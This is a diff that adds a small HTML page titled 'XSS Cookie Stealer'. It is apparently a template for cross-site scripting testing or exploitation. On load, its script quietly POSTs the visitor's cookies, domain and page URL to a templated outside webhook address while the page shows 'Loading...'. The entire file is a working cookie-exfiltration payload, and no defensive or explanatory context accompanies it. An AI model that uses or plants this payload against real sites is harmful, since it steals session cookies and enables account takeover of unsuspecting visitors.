@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS Cookie Stealer</title>
+</head>
+<body>
+    <h1>Cookie Stealer Test</h1>
+    <script>
+        // Send cookies to webhook
+        fetch('{{WEBHOOK_URL}}/cookies', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                domain: document.domain,
+                cookies: document.cookie,
+                url: window.location.href
+            })
+        });
+    </script>
+    <p>Loading...</p>
+</body>
+</html>
